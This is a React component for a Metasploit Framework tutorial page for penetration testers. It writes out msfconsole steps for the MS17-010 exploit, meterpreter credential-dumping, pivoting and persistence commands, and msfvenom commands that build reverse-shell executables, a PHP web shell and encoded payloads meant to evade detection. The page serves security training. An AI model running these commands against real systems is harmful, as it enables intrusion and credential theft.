import React from "react";

const Metasploit: React.FC = () => (
  <div className="p-8 space-y-8 rounded-xl shadow-lg mt-20">
    <h1 className="text-4xl font-extrabold border-b-2 pb-2">
      Metasploit Framework
    </h1>
    <p className="text-sm text-gray-500">Last Updated: 17 Jan, 2026</p>

    <p className="text-lg leading-relaxed">
      Metasploit is the world's most used penetration testing framework. It helps security
      professionals find vulnerabilities, verify vulnerability mitigations, and manage security
      assessments. It provides a complete environment for penetration testing and exploit development.
    </p>

    <h2 className="text-3xl font-bold mt-8">Metasploit Architecture</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Metasploit Framework Architecture:

+------------------------------------------------------------------+
|                     METASPLOIT FRAMEWORK                          |
+------------------------------------------------------------------+
|                                                                   |
|  +-----------+  +-----------+  +-----------+  +-----------+      |
|  | EXPLOITS  |  | PAYLOADS  |  | AUXILIARY |  |   POST    |      |
|  | (2000+)   |  | (500+)    |  | (1000+)   |  | (300+)    |      |
|  +-----------+  +-----------+  +-----------+  +-----------+      |
|                                                                   |
|  +-----------+  +-----------+  +-----------+  +-----------+      |
|  | ENCODERS  |  |   NOPS    |  | EVASION   |  | LISTENERS |      |
|  +-----------+  +-----------+  +-----------+  +-----------+      |
|                                                                   |
+------------------------------------------------------------------+
|                         INTERFACES                                |
|  +-------------+  +-------------+  +-------------+                |
|  | msfconsole  |  |  Armitage   |  |   msfweb    |                |
|  | (CLI)       |  |  (GUI)      |  |   (Web)     |                |
|  +-------------+  +-------------+  +-------------+                |
+------------------------------------------------------------------+

Module Types:
- Exploits:   Code that takes advantage of vulnerabilities
- Payloads:   Code that runs on the target after exploitation
- Auxiliary:  Scanning, fuzzing, sniffing modules
- Post:       Post-exploitation modules
- Encoders:   Payload encoding for evasion
- Nops:       No-operation instructions`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Msfconsole Basics</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Starting Metasploit:

$ msfconsole

msf6 > help                    # Show help
msf6 > search <keyword>        # Search modules
msf6 > use <module>            # Select module
msf6 > info                    # Show module info
msf6 > show options            # Show required options
msf6 > set <option> <value>    # Set option
msf6 > exploit / run           # Execute module
msf6 > back                    # Go back
msf6 > exit                    # Exit msfconsole

# Database commands
msf6 > db_status              # Check DB connection
msf6 > workspace              # List workspaces
msf6 > hosts                  # Show discovered hosts
msf6 > services               # Show discovered services
msf6 > vulns                  # Show vulnerabilities`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Exploitation Workflow</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Step</th>
            <th className="p-3 border">Command</th>
            <th className="p-3 border">Description</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">1. Search</td>
            <td className="p-3 border font-mono text-gray-900">search type:exploit name:smb</td>
            <td className="p-3 border">Find relevant exploits</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">2. Select</td>
            <td className="p-3 border font-mono text-gray-900">use exploit/windows/smb/ms17_010</td>
            <td className="p-3 border">Choose exploit module</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">3. Info</td>
            <td className="p-3 border font-mono text-gray-900">info</td>
            <td className="p-3 border">Review exploit details</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">4. Options</td>
            <td className="p-3 border font-mono text-gray-900">show options</td>
            <td className="p-3 border">View required settings</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">5. Configure</td>
            <td className="p-3 border font-mono text-gray-900">set RHOSTS 192.168.1.100</td>
            <td className="p-3 border">Set target options</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">6. Payload</td>
            <td className="p-3 border font-mono text-gray-900">set PAYLOAD windows/meterpreter/reverse_tcp</td>
            <td className="p-3 border">Select payload</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">7. Execute</td>
            <td className="p-3 border font-mono text-gray-900">exploit</td>
            <td className="p-3 border">Run the exploit</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">Payload Types</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Payload Categories:

1. SINGLES (Inline)
   - Self-contained payloads
   - Smaller, simpler
   - Example: windows/shell_reverse_tcp

2. STAGERS
   - Set up connection between attacker and target
   - Small footprint
   - Example: windows/meterpreter/reverse_tcp (stager)

3. STAGES
   - Downloaded by stagers
   - Larger, more features
   - Example: meterpreter (stage)

Common Payloads:
+---------------------------+--------------------------------+
| Payload                   | Description                    |
+---------------------------+--------------------------------+
| generic/shell_reverse_tcp | Basic reverse shell            |
| windows/meterpreter/      | Windows Meterpreter reverse    |
|   reverse_tcp             |                                |
| linux/x64/meterpreter/    | Linux Meterpreter reverse      |
|   reverse_tcp             |                                |
| php/meterpreter/reverse_  | PHP Meterpreter                |
|   tcp                     |                                |
| cmd/unix/reverse_python   | Python reverse shell           |
+---------------------------+--------------------------------+`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Meterpreter Commands</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Meterpreter Post-Exploitation:

# System Commands
meterpreter > sysinfo           # System information
meterpreter > getuid            # Current user
meterpreter > getsystem         # Attempt privilege escalation
meterpreter > ps                # List processes
meterpreter > migrate <PID>     # Migrate to another process

# File System
meterpreter > pwd               # Print working directory
meterpreter > ls                # List files
meterpreter > cd <dir>          # Change directory
meterpreter > download <file>   # Download file
meterpreter > upload <file>     # Upload file

# Network
meterpreter > ipconfig          # Network configuration
meterpreter > portfwd           # Port forwarding
meterpreter > route             # Routing table

# Credential Harvesting
meterpreter > hashdump          # Dump password hashes
meterpreter > load kiwi         # Load Mimikatz
meterpreter > creds_all         # Get all credentials

# Pivoting
meterpreter > run autoroute -s <subnet>
meterpreter > background        # Background session
msf6 > use auxiliary/server/socks_proxy

# Persistence
meterpreter > run persistence -h`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Auxiliary Modules</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Category</th>
            <th className="p-3 border">Example Module</th>
            <th className="p-3 border">Purpose</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">Scanner</td>
            <td className="p-3 border font-mono text-gray-900">auxiliary/scanner/portscan/tcp</td>
            <td className="p-3 border">Port scanning</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Discovery</td>
            <td className="p-3 border font-mono text-gray-900">auxiliary/scanner/smb/smb_version</td>
            <td className="p-3 border">Service enumeration</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Brute Force</td>
            <td className="p-3 border font-mono text-gray-900">auxiliary/scanner/ssh/ssh_login</td>
            <td className="p-3 border">Credential testing</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Fuzzing</td>
            <td className="p-3 border font-mono text-gray-900">auxiliary/fuzzers/http/http_form_field</td>
            <td className="p-3 border">Input fuzzing</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">DoS</td>
            <td className="p-3 border font-mono text-gray-900">auxiliary/dos/tcp/synflood</td>
            <td className="p-3 border">Denial of service testing</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">MSFvenom Payload Generation</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`MSFvenom - Payload Generator:

# List payloads
msfvenom -l payloads

# List encoders
msfvenom -l encoders

# List formats
msfvenom -l formats

# Generate Windows executable
msfvenom -p windows/meterpreter/reverse_tcp \\
         LHOST=192.168.1.10 LPORT=4444 \\
         -f exe -o payload.exe

# Generate Linux executable
msfvenom -p linux/x64/meterpreter/reverse_tcp \\
         LHOST=192.168.1.10 LPORT=4444 \\
         -f elf -o payload.elf

# Generate web shell
msfvenom -p php/meterpreter/reverse_tcp \\
         LHOST=192.168.1.10 LPORT=4444 \\
         -f raw -o shell.php

# Encode payload (evasion)
msfvenom -p windows/meterpreter/reverse_tcp \\
         LHOST=192.168.1.10 LPORT=4444 \\
         -e x86/shikata_ga_nai -i 5 \\
         -f exe -o encoded.exe`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Key Points to Remember</h2>
    <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li>Always obtain proper authorization before using Metasploit</li>
        <li>Use workspaces to organize different assessments</li>
        <li>Meterpreter provides extensive post-exploitation capabilities</li>
        <li>MSFvenom generates standalone payloads for various platforms</li>
        <li>Keep the framework updated with msfupdate</li>
        <li>Document all activities for professional reporting</li>
      </ul>
    </div>
  </div>
);

export default Metasploit;
